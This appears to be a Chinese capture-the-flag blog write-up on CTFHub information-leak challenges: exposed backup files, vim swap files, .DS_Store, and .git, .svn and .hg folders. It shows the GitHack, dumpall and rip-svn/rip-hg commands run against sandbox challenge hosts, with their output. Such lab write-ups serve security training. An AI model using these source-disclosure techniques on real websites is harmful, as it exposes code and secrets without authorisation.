<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>信息泄漏 | 0opsdc</title><meta name=keywords content="CTFHub"><meta name=description content="目录遍历 Des: N/A。
页面如下：
点击按钮后会进入一个在线FTP目录：
挨个进入查看即可。
获得flag。
PHPINFO Des: N/A。
页面如下：
点击按钮进入phpinfo页面，Ctrl+F搜索flag即可在Environment中的变量中找到flag。
获得flag。
拓展：phpinfo PHP: phpinfo - Manual
phpinfo包含所有EGPCS(Environment, GET, POST, Cookie, Server)数据，通过phpinfo页面我们能获取到服务器的很多配置信息，在后续的文件上传等操作上能依据该页面的禁用函数定制攻击手法。
备份文件下载 网站源码 Des: 当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。
页面如下：
尝试访问www.zip，成功获取网站源码。
获得flag。
bak文件 Des: 当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。
页面内容如下：
Flag in index.php source code. 网站默认首页为index.php，查看页面源码没有任何信息，尝试获取index.php源码，联想到题目给的bak文件，尝试访问index.php.bak，成功获取index.php.bak文件。
获得flag。
vim缓存 Des: 当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。
页面如下：
备份文件下载 - vim flag 在 index.php 源码中 页面提示我们获取index.php文件，再根据题目名称我们大概可知具体方法为获取index.php的vim缓存文件，访问.index.php.swp即可，此处在index.php之前加.是因为vim缓存文件默认为隐藏文件，所以文件名前有个.。获取到index.php.swp文件后我们先在Linux中使用touch命令创建一个同名文件index.php，再使用vim -r <filename>恢复文件内容。
拓展：vim文件备份 用户在使用vim的过程中若因断电、网络不稳定(如终端突然断开等情况)等原因突然中断文件编辑时，第一次vim会在当前目录生成一个与编辑文件同名的后缀为.swp的备份文件，第二次后缀为swo，第三次后缀为swn。用户可使用vim -r命令查看当前目录下的所有swp文件，在当前目录存在与备份文件同名的文件时，使用vim -r <filename>命令将备份文件中的内容覆盖至文件。
.DS_Store Des: ."><meta name=author content="0opsdc"><link rel=canonical href=https://oopsdc.com/post/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/><link crossorigin=anonymous href=/assets/css/stylesheet.56b5cc8c8054cf5f30eac4b81af2021f829171098f6e116bb016ed77e3264a36.css integrity="sha256-VrXMjIBUz18w6sS4GvICH4KRcQmPbhFrsBbtd+MmSjY=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png><link rel=icon type=image/png sizes=16x16 href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png><link rel=icon type=image/png sizes=32x32 href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png><link rel=apple-touch-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png><link rel=mask-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="信息泄漏"><meta property="og:description" content="目录遍历 Des: N/A。
页面如下：
点击按钮后会进入一个在线FTP目录：
挨个进入查看即可。
获得flag。
PHPINFO Des: N/A。
页面如下：
点击按钮进入phpinfo页面，Ctrl+F搜索flag即可在Environment中的变量中找到flag。
获得flag。
拓展：phpinfo PHP: phpinfo - Manual
phpinfo包含所有EGPCS(Environment, GET, POST, Cookie, Server)数据，通过phpinfo页面我们能获取到服务器的很多配置信息，在后续的文件上传等操作上能依据该页面的禁用函数定制攻击手法。
备份文件下载 网站源码 Des: 当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。
页面如下：
尝试访问www.zip，成功获取网站源码。
获得flag。
bak文件 Des: 当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。
页面内容如下：
Flag in index.php source code. 网站默认首页为index.php，查看页面源码没有任何信息，尝试获取index.php源码，联想到题目给的bak文件，尝试访问index.php.bak，成功获取index.php.bak文件。
获得flag。
vim缓存 Des: 当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。
页面如下：
备份文件下载 - vim flag 在 index.php 源码中 页面提示我们获取index.php文件，再根据题目名称我们大概可知具体方法为获取index.php的vim缓存文件，访问.index.php.swp即可，此处在index.php之前加.是因为vim缓存文件默认为隐藏文件，所以文件名前有个.。获取到index.php.swp文件后我们先在Linux中使用touch命令创建一个同名文件index.php，再使用vim -r <filename>恢复文件内容。
拓展：vim文件备份 用户在使用vim的过程中若因断电、网络不稳定(如终端突然断开等情况)等原因突然中断文件编辑时，第一次vim会在当前目录生成一个与编辑文件同名的后缀为.swp的备份文件，第二次后缀为swo，第三次后缀为swn。用户可使用vim -r命令查看当前目录下的所有swp文件，在当前目录存在与备份文件同名的文件时，使用vim -r <filename>命令将备份文件中的内容覆盖至文件。
.DS_Store Des: ."><meta property="og:type" content="article"><meta property="og:url" content="https://oopsdc.com/post/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"><meta property="og:image" content="https://oopsdc.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="post"><meta property="article:published_time" content="2022-08-11T20:27:10+08:00"><meta property="article:modified_time" content="2022-08-11T20:27:10+08:00"><meta property="og:site_name" content="0opsdc"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://oopsdc.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="信息泄漏"><meta name=twitter:description content="目录遍历 Des: N/A。
页面如下：
点击按钮后会进入一个在线FTP目录：
挨个进入查看即可。
获得flag。
PHPINFO Des: N/A。
页面如下：
点击按钮进入phpinfo页面，Ctrl+F搜索flag即可在Environment中的变量中找到flag。
获得flag。
拓展：phpinfo PHP: phpinfo - Manual
phpinfo包含所有EGPCS(Environment, GET, POST, Cookie, Server)数据，通过phpinfo页面我们能获取到服务器的很多配置信息，在后续的文件上传等操作上能依据该页面的禁用函数定制攻击手法。
备份文件下载 网站源码 Des: 当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。
页面如下：
尝试访问www.zip，成功获取网站源码。
获得flag。
bak文件 Des: 当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。
页面内容如下：
Flag in index.php source code. 网站默认首页为index.php，查看页面源码没有任何信息，尝试获取index.php源码，联想到题目给的bak文件，尝试访问index.php.bak，成功获取index.php.bak文件。
获得flag。
vim缓存 Des: 当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。
页面如下：
备份文件下载 - vim flag 在 index.php 源码中 页面提示我们获取index.php文件，再根据题目名称我们大概可知具体方法为获取index.php的vim缓存文件，访问.index.php.swp即可，此处在index.php之前加.是因为vim缓存文件默认为隐藏文件，所以文件名前有个.。获取到index.php.swp文件后我们先在Linux中使用touch命令创建一个同名文件index.php，再使用vim -r <filename>恢复文件内容。
拓展：vim文件备份 用户在使用vim的过程中若因断电、网络不稳定(如终端突然断开等情况)等原因突然中断文件编辑时，第一次vim会在当前目录生成一个与编辑文件同名的后缀为.swp的备份文件，第二次后缀为swo，第三次后缀为swn。用户可使用vim -r命令查看当前目录下的所有swp文件，在当前目录存在与备份文件同名的文件时，使用vim -r <filename>命令将备份文件中的内容覆盖至文件。
.DS_Store Des: ."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://oopsdc.com/post/"},{"@type":"ListItem","position":2,"name":"信息泄漏","item":"https://oopsdc.com/post/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"信息泄漏","name":"信息泄漏","description":"目录遍历 Des: N/A。\n页面如下：\n点击按钮后会进入一个在线FTP目录：\n挨个进入查看即可。\n获得flag。\nPHPINFO Des: N/A。\n页面如下：\n点击按钮进入phpinfo页面，Ctrl+F搜索flag即可在Environment中的变量中找到flag。\n获得flag。\n拓展：phpinfo PHP: phpinfo - Manual\nphpinfo包含所有EGPCS(Environment, GET, POST, Cookie, Server)数据，通过phpinfo页面我们能获取到服务器的很多配置信息，在后续的文件上传等操作上能依据该页面的禁用函数定制攻击手法。\n备份文件下载 网站源码 Des: 当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。\n页面如下：\n尝试访问www.zip，成功获取网站源码。\n获得flag。\nbak文件 Des: 当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。\n页面内容如下：\nFlag in index.php source code. 网站默认首页为index.php，查看页面源码没有任何信息，尝试获取index.php源码，联想到题目给的bak文件，尝试访问index.php.bak，成功获取index.php.bak文件。\n获得flag。\nvim缓存 Des: 当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。\n页面如下：\n备份文件下载 - vim flag 在 index.php 源码中 页面提示我们获取index.php文件，再根据题目名称我们大概可知具体方法为获取index.php的vim缓存文件，访问.index.php.swp即可，此处在index.php之前加.是因为vim缓存文件默认为隐藏文件，所以文件名前有个.。获取到index.php.swp文件后我们先在Linux中使用touch命令创建一个同名文件index.php，再使用vim -r \u0026lt;filename\u0026gt;恢复文件内容。\n拓展：vim文件备份 用户在使用vim的过程中若因断电、网络不稳定(如终端突然断开等情况)等原因突然中断文件编辑时，第一次vim会在当前目录生成一个与编辑文件同名的后缀为.swp的备份文件，第二次后缀为swo，第三次后缀为swn。用户可使用vim -r命令查看当前目录下的所有swp文件，在当前目录存在与备份文件同名的文件时，使用vim -r \u0026lt;filename\u0026gt;命令将备份文件中的内容覆盖至文件。\n.DS_Store Des: .","keywords":["CTFHub"],"articleBody":"目录遍历 Des: N/A。\n页面如下：\n点击按钮后会进入一个在线FTP目录：\n挨个进入查看即可。\n获得flag。\nPHPINFO Des: N/A。\n页面如下：\n点击按钮进入phpinfo页面，Ctrl+F搜索flag即可在Environment中的变量中找到flag。\n获得flag。\n拓展：phpinfo PHP: phpinfo - Manual\nphpinfo包含所有EGPCS(Environment, GET, POST, Cookie, Server)数据，通过phpinfo页面我们能获取到服务器的很多配置信息，在后续的文件上传等操作上能依据该页面的禁用函数定制攻击手法。\n备份文件下载 网站源码 Des: 当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。\n页面如下：\n尝试访问www.zip，成功获取网站源码。\n获得flag。\nbak文件 Des: 当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。\n页面内容如下：\nFlag in index.php source code. 网站默认首页为index.php，查看页面源码没有任何信息，尝试获取index.php源码，联想到题目给的bak文件，尝试访问index.php.bak，成功获取index.php.bak文件。\n获得flag。\nvim缓存 Des: 当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。\n页面如下：\n备份文件下载 - vim flag 在 index.php 源码中 页面提示我们获取index.php文件，再根据题目名称我们大概可知具体方法为获取index.php的vim缓存文件，访问.index.php.swp即可，此处在index.php之前加.是因为vim缓存文件默认为隐藏文件，所以文件名前有个.。获取到index.php.swp文件后我们先在Linux中使用touch命令创建一个同名文件index.php，再使用vim -r 恢复文件内容。\n拓展：vim文件备份 用户在使用vim的过程中若因断电、网络不稳定(如终端突然断开等情况)等原因突然中断文件编辑时，第一次vim会在当前目录生成一个与编辑文件同名的后缀为.swp的备份文件，第二次后缀为swo，第三次后缀为swn。用户可使用vim -r命令查看当前目录下的所有swp文件，在当前目录存在与备份文件同名的文件时，使用vim -r 命令将备份文件中的内容覆盖至文件。\n.DS_Store Des: .DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。\n页面内容：\n备份文件下载 - DS_Store 试着寻找 flag 此处使用dumpall工具0xHJK/dumpall: 一款信息泄漏利用工具，适用于.git/.svn/.DS_Store泄漏和目录列出 (github.com)：\npython3 dumpall.py -u http://challenge-1e2e8ffbe3e72091.sandbox.ctfhub.com:10800/.DS_Store 结果：\n[200] http://challenge-1e2e8ffbe3e72091.sandbox.ctfhub.com:10800/47a90c9e8d66b6a1eb9c411204e7a934.txt 47a90c9e8d66b6a1eb9c411204e7a934.txt 直接访问链接。\n获得flag。\nGit泄露 Log Des: 当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题。\n工具地址：BugScanTeam/GitHack: .git 泄漏利用工具，可还原历史版本 (github.com)\n工具利用：\npython2 GitHack.py http://challenge-dc11daca3e6b9249.sandbox.ctfhub.com:10800/.git # 攻击日志 ____ _ _ _ _ _ / ___(_) |_| | | | __ _ ___| | __ | | _| | __| |_| |/ _` |/ __| |/ / | |_| | | |_| _ | (_| | (__| \u003c \\____|_|\\__|_| |_|\\__,_|\\___|_|\\_\\{0.0.5} A '.git' folder disclosure exploit. [*] Check Depends [+] Check depends end [*] Set Paths [*] Target Url: http://challenge-dc11daca3e6b9249.sandbox.ctfhub.com:10800/.git/ [*] Initialize Target [*] Try to Clone straightly [*] Clone Cloning into '/root/tools/GitHack/dist/challenge-dc11daca3e6b9249.sandbox.ctfhub.com_10800'... fatal: repository 'http://challenge-dc11daca3e6b9249.sandbox.ctfhub.com:10800/.git/' not found [-] Clone Error [*] Try to Clone with Directory Listing [*] http://challenge-dc11daca3e6b9249.sandbox.ctfhub.com:10800/.git/ is not support Directory Listing [-] [Skip][First Try] Target is not support Directory Listing [*] Try to clone with Cache [*] Initialize Git [!] Initialize Git Error: hint: Using 'master' as the name for the initial branch. This default branch name hint: is subject to change. To configure the initial branch name to use in all hint: of your new repositories, which will suppress this warning, call: hint: hint: git config --global init.defaultBranch hint: hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and hint: 'development'. The just-created branch can be renamed via this command: hint: hint: git branch -m [*] Cache files [*] packed-refs [*] config [*] HEAD [*] COMMIT_EDITMSG [*] ORIG_HEAD [*] FETCH_HEAD [*] refs/heads/master [*] refs/remote/master [*] index [*] logs/HEAD [*] logs/refs/heads/master [*] Fetch Commit Objects [*] objects/98/10bf645254762b81c98bd738807624695fc847 [*] objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64 [*] objects/5e/975018cc48f4f1bd619ba6afbebfa9b295701d [*] objects/3a/ba889186ca4defd4a2083371d7e524d53abf33 [*] objects/90/71e0a24f654c88aa97a2273ca595e301b7ada5 [*] objects/2c/59e3024e3bc350976778204928a21d9ff42d01 [*] objects/25/222d3363054bd0718d58f51389c438681a145a [*] objects/89/04d877c841d1afd9e2dfaf879e9e785ac90822 [*] Fetch Commit Objects End [*] logs/refs/remote/master [*] logs/refs/stash [*] refs/stash [*] Valid Repository [+] Valid Repository Success [+] Clone Success. Dist File : /root/tools/GitHack/dist/challenge-dc11daca3e6b9249.sandbox.ctfhub.com_10800 # 切换至对应目录 cd dist/challenge-dc11daca3e6b9249.sandbox.ctfhub.com_10800 # git log查看提交历史 git log commit 9810bf645254762b81c98bd738807624695fc847 (HEAD -\u003e master) Author: CTFHub Date: Mon Aug 15 07:42:21 2022 +0000 remove flag commit 5e975018cc48f4f1bd619ba6afbebfa9b295701d Author: CTFHub Date: Mon Aug 15 07:42:21 2022 +0000 add flag commit 25222d3363054bd0718d58f51389c438681a145a Author: CTFHub Date: Mon Aug 15 07:42:21 2022 +0000 init # 可见5e97分支存在flag，我们选择回滚到该分支即可 git reset --hard 5e97 HEAD is now at 5e97501 add flag # 查看当前目录下文件 ls 170172042812400.txt 50x.html index.html 查看txt文件即可。\n获得flag。\n拓展：git简介及git回滚命令 git是一个开源的分布式版本控制系统，可用于管理代码和工作流，以commit为单位。\n当我们需要对git目录进行回滚时，可使用git reset目录，具体有两种用法：\n1. 回滚到指定分支 git reset --hard 2. 回滚到上一分支 git reset --hard HEAD^ 我们还可以进一步使用命令回滚到上上一个分支 git reset --hard HEAD^^ 在输入commit_id时，若id前几位(如前四位)在提交记录中值唯一，那么我们只需输入前四位即可，回滚代码还可使用git revert，此处不详写，感兴趣的读者可自行查阅资料。\nStash Des: 同上。\n还是使用GitHack工具，进入对应后查看相关信息：\n# 命令 git log # 结果 commit 8ae0b10fa29bf706e479f82f6717cb8b2caa5a59 (HEAD -\u003e master) Author: CTFHub Date: Mon Aug 15 14:14:02 2022 +0000 remove flag commit b6111d1498aba67660cb6eca093a7cc94038bb5a Author: CTFHub Date: Mon Aug 15 14:14:02 2022 +0000 add flag commit d3ee626ec78900eb2fd1ef4db73be31ff2136ba9 Author: CTFHub Date: Mon Aug 15 14:14:02 2022 +0000 init # 查看当前目录下的文件 ls 50x.html index.html # 查看通过git stash存储的修改列表 git stash list stash@{0}: WIP on master: b6111d1 add flag # 将修改追加到最新提交之后，也就是将list中的flag追加到最新提交后 git stash pop # 查看当前目录下的文件 ls 12452555114914.txt 50x.html index.html 获得flag。\n拓展：git stash简介 git stash一般应用在一些比较复杂的环境中，这条命令会将本地修改保存并将当前代码切换到HEAD提交上。git stash命令其实就是git stash save命令的简写，我们还可通过git stash list查看修改列表、git stash show校验修改列表、git stash apply重新存储。最新的存储位于ref/stash中，可通过stash@{0}获取最新存储，stash@{1}获取次新存储，以此类推。\ngit stash的每个存储单元在工作仓库中通过commit的形式，由树结构进行展示，其根节点为HEAD所在的提交，工作树如图所示，H代表HEAD提交，I代表存储单元的提交，W代表工作单元的提交：\n此处我们以开发过程中需要同步远端代码的情况为例：当我们在进行开发还未调试完成时，不想提交当前代码，但又需要同步关联远端代码。在本地代码和远端代码没有冲突时，可使用git pull命令，但若存在冲突则会拒绝覆盖当前修改，在这种情况下我们仅需使用git stash保存本地代码，git pull同步远端代码后再使用git stash pop将本地代码追加进当前分支即可：\ngit stash git pull git stash pop Index Des: 同上。\n# 使用工具 python2 GitHack.py http://challenge-d24592e5c3a594ff.sandbox.ctfhub.com:10800/.git # 切换到对应目录 cd dist/challenge-d24592e5c3a594ff.sandbox.ctfhub.com_10800 # 查看目录下文件 ls 264482891025009.txt 50x.html index.html 获得flag。\nSVN泄露 Des: 当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。\n此处使用的kost/dvcs-ripper: Rip web accessible (distributed) version control systems: SVN/GIT/HG… (github.com)工具：\n# 在运行成功前有两处报错，此处贴上解决方法 报错1：Can't locate DBI.pm in @INC (you may need to install the DBI module) (@INC contains: /etc/perl /usr/local/lib/x86_64-linux-gnu/perl/5.34.0 /usr/local/share/perl/5.34.0 /usr/lib/x86_64-linux-gnu/perl5/5.34 /usr/share/perl5 /usr/lib/x86_64-linux-gnu/perl-base /usr/lib/x86_64-linux-gnu/perl/5.34 /usr/share/perl/5.34 /usr/local/lib/site_perl) at ./rip-svn.pl line 7. BEGIN failed--compilation aborted at ./rip-svn.pl line 7. 解决方法：apt install -y libdbi-perl 报错2：install_driver(SQLite) failed: Can't locate DBD/SQLite.pm in @INC (you may need to install the DBD::SQLite module) (@INC contains: /etc/perl /usr/local/lib/x86_64-linux-gnu/perl/5.34.0 /usr/local/share/perl/5.34.0 /usr/lib/x86_64-linux-gnu/perl5/5.34 /usr/share/perl5 /usr/lib/x86_64-linux-gnu/perl-base /usr/lib/x86_64-linux-gnu/perl/5.34 /usr/share/perl/5.34 /usr/local/lib/site_perl) at (eval 42) line 3. Perhaps the DBD::SQLite perl module hasn't been fully installed, or perhaps the capitalisation of 'SQLite' isn't right. Available drivers: DBM, ExampleP, File, Gofer, Mem, Proxy, Sponge. at ./rip-svn.pl line 85. 解决方法：apt install -y libdbd-sqlite3-perl # 工具利用 ./rip-svn.pl -v -u http://challenge-ee8bd450d496d834.sandbox.ctfhub.com:10800/.svn/ [i] Found new SVN client storage format! REP INFO =\u003e 1:file:///opt/svn/ctfhub:e43e7ef8-82fb-4194-9673-81c29de69c33 [i] Trying to revert the tree, if you get error, upgrade your SVN client! # 查看当前目录下.svn目录树 tree .svn .svn ├── entries ├── format ├── pristine │ ├── 24 │ │ └── 24e3ff39c1fc315ce64dc8e13aed8bcdc6acecdd.svn-base │ └── bf │ └── bf45c36a4dfb73378247a6311eac4f80f48fcb92.svn-base ├── text-base ├── tmp └── wc.db 查看prisine里的文件即可。\n获得flag。\nHG泄露 Des: 当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。\n还是使用上一题的工具：\n./rip-hg.pl -v -u http://challenge-22e6994653073985.sandbox.ctfhub.com:10800/.hg/ [i] Downloading hg files from http://challenge-22e6994653073985.sandbox.ctfhub.com:10800/.hg/ [i] Auto-detecting 404 as 200 with 3 requests [i] Getting correct 404 responses [d] found 00changelog.i [d] found dirstate [d] found requires [!] Not found for branch: 404 Not Found [!] Not found for branchheads.cache: 404 Not Found [d] found last-message.txt [!] Not found for tags.cache: 404 Not Found [d] found undo.branch [d] found undo.desc [d] found undo.dirstate [d] found store/00changelog.i [!] Not found for store/00changelog.d: 404 Not Found [d] found store/00manifest.i [!] Not found for store/00manifest.d: 404 Not Found [d] found store/fncache [d] found store/undo [!] Not found for .hgignore: 404 Not Found [i] Running hg status to check for missing items cannot find hg: No such file or directory at ./rip-hg.pl line 140. # 查看.hg目录树 tree .hg .hg ├── 00changelog.i ├── dirstate ├── last-message.txt ├── requires ├── store │ ├── 00changelog.i │ ├── 00manifest.i │ ├── data │ ├── fncache │ └── undo ├── undo.branch ├── undo.desc └── undo.dirstate # 查看目录状态 cat .hg/dirstate \u00268�}1�\u0026Y�\u0006\u0017�PiH,G\u0005��n��\u0001�^c50x.htmln��\u0001 ^K�* index.htmln��!b�M�\u0013flag_2935626550.txt 构造链接http://challenge-22e6994653073985.sandbox.ctfhub.com:10800/flag_2935626550.txt。\n获得flag。\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n","wordCount":"968","inLanguage":"en","datePublished":"2022-08-11T20:27:10+08:00","dateModified":"2022-08-11T20:27:10+08:00","author":{"@type":"Person","name":"0opsdc"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://oopsdc.com/post/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},"publisher":{"@type":"Organization","name":"0opsdc","logo":{"@type":"ImageObject","url":"https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png"}}}</script><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script><meta name=referrer content="no-referrer-when-downgrade"></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://oopsdc.com/ accesskey=h title="Home (Alt + H)">Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://oopsdc.com/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://oopsdc.com/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://oopsdc.com/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://oopsdc.com/about/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://oopsdc.com/>Home</a>&nbsp;»&nbsp;<a href=https://oopsdc.com/post/>Posts</a></div><h1 class=post-title>信息泄漏</h1><div class=post-meta>Created:&nbsp;<span title='2022-08-11 20:27:10 +0800 CST'>2022-08-11</span>&nbsp;·&nbsp;Updated:&nbsp;2022-08-11&nbsp;·&nbsp;0opsdc<div class=meta-item>&nbsp·&nbsp
        <span id=busuanzi_container_page_pv>Article Views: <span id=busuanzi_value_page_pv></span> times</span></div></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#%e7%9b%ae%e5%bd%95%e9%81%8d%e5%8e%86 aria-label=目录遍历>目录遍历</a></li><li><a href=#phpinfo aria-label=PHPINFO>PHPINFO</a><ul><li><a href=#%e6%8b%93%e5%b1%95phpinfo aria-label=拓展：phpinfo>拓展：phpinfo</a></li></ul></li><li><a href=#%e5%a4%87%e4%bb%bd%e6%96%87%e4%bb%b6%e4%b8%8b%e8%bd%bd aria-label=备份文件下载>备份文件下载</a><ul><li><a href=#%e7%bd%91%e7%ab%99%e6%ba%90%e7%a0%81 aria-label=网站源码>网站源码</a></li><li><a href=#bak%e6%96%87%e4%bb%b6 aria-label=bak文件>bak文件</a></li><li><a href=#vim%e7%bc%93%e5%ad%98 aria-label=vim缓存>vim缓存</a></li><li><a href=#%e6%8b%93%e5%b1%95vim%e6%96%87%e4%bb%b6%e5%a4%87%e4%bb%bd aria-label=拓展：vim文件备份>拓展：vim文件备份</a></li><li><a href=#ds_store aria-label=.DS_Store>.DS_Store</a></li></ul></li><li><a href=#git%e6%b3%84%e9%9c%b2 aria-label=Git泄露>Git泄露</a><ul><li><a href=#log aria-label=Log>Log</a></li><li><a href=#%e6%8b%93%e5%b1%95git%e7%ae%80%e4%bb%8b%e5%8f%8agit%e5%9b%9e%e6%bb%9a%e5%91%bd%e4%bb%a4 aria-label=拓展：git简介及git回滚命令>拓展：git简介及git回滚命令</a></li><li><a href=#stash aria-label=Stash>Stash</a><ul><li><a href=#%e6%8b%93%e5%b1%95git-stash%e7%ae%80%e4%bb%8b aria-label="拓展：git stash简介">拓展：git stash简介</a></li></ul></li><li><a href=#index aria-label=Index>Index</a></li></ul></li><li><a href=#svn%e6%b3%84%e9%9c%b2 aria-label=SVN泄露>SVN泄露</a></li><li><a href=#hg%e6%b3%84%e9%9c%b2 aria-label=HG泄露>HG泄露</a></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const 